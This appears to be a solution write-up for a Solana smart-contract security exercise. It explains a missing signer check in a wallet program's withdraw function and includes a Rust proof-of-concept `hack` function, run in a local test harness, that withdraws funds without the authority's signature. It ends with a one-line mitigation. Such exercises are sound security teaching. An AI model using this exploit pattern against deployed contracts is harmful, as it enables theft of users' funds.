# Solution - Missing Signer Check

The vulnerability in this contract is a missing signer check in the withdraw function:

The wallet authority does not have to sign the execution of the instruction. This has the effect, that everybody can pretend to be the authority.

```rust
use {
    borsh::BorshSerialize,
    solana_program::{
        instruction::{AccountMeta, Instruction},
        pubkey::Pubkey,
        system_program,
    },
    solana_program_test::*,
    solana_sdk::{
        account::Account,
        hash::Hash,
        signature::{Keypair, Signer},
        transaction::Transaction,
    },
};

use wallet_what_wallet::instruction::WalletInstruction;
use wallet_what_wallet::state::{Wallet, WALLET_LEN};

async fn hack(
    banks_client: &mut BanksClient,
    payer: &Keypair,
    recent_blockhash: Hash,
    program_id: &Pubkey,
    wallet_address: Pubkey,
    wallet_authority: &Pubkey,
    destination: &Pubkey,
    amount: u64,
) -> Result<(), BanksClientError> {
    // Create withdraw instruction using the vulnerability:
    // The withdraw function only checks if the authority key matches
    // but doesn't verify that the authority actually signed the transaction
    let withdraw_instruction = Instruction::new_with_borsh(
        *program_id,
        &WalletInstruction::Withdraw { amount },
        vec![
            AccountMeta::new(wallet_address, false), // wallet_info
            AccountMeta::new_readonly(*wallet_authority, false), // authority_info - NOT SIGNING!
            AccountMeta::new(*destination, false),   // destination_info
        ],
    );

    // Create and sign transaction - only payer signs, not the wallet authority
    let mut transaction =
        Transaction::new_with_payer(&[withdraw_instruction], Some(&payer.pubkey()));
    transaction.sign(&[payer], recent_blockhash);

    // Execute the hack
    banks_client.process_transaction(transaction).await
}
```

# Mitigation

By adding a check in the `withdraw` function, to check if the `wallet_info` is signed this vulnerability can be prevented:

```rust
assert!(authority_info.is_signer);
```

# Additional Resources

[Singer Auth Lesson](https://solana.com/developers/courses/program-security/signer-auth)
